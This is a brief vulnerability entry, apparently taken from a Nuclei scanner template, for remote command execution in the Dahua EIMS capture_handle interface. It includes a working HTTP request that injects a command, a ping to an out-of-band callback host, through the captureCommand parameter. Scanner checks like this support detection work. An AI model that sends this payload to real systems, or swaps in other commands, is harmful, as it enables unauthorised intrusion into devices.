# Vulnerability: Dahua EIMS - Remote Command Execution
**Classification:** CWE-77,CWE-78
**Source:** Nuclei Template (`dahua-eims-rce.yaml`)

## Description
Dahua EIMS capture_handle interface allows remote command execution.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
```

